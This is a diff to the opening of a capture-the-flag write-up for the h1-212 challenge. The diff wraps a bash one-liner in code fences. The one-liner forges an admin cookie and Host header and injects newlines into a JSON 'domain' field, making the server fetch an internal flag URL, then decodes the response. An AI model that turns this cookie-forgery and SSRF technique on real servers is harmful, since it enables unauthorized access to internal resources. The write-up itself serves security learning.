@@ -3,11 +3,13 @@ The h1-212 CTF
 TL;DR 
 Bash 1-liner to solve the challenge that can be run on OS X or most any linux box with curl, awk, and base64:
 
+```
 curl -H "Content-Type: application/json" -H "Host: admin.acme.org" -b admin=yes \
 http://104.236.20.43/read.php?id=`curl -H "Content-Type: application/json" \
 -H "Host: admin.acme.org" -b admin=yes -d "{\"domain\":\"212\n127.0.0.1:1337/flag\n.com\"}" \
 http://104.236.20.43/ -s|awk -F\= '{print $2}'|awk -F \" '{print $1-1}'` -s|awk -F\" \
 '{print $4}'| base64 --decode
+```
 
 Background:
 An engineer of acme.org launched a new server for a new admin panel at http://104.236.20.43/. He is completely confident that the server can’t be hacked. He added a tripwire that notifies him when the flag file is read. He also noticed that the default Apache page is still there, but according to him that’s intentional and doesn’t hurt anyone. Your goal? Read the flag!
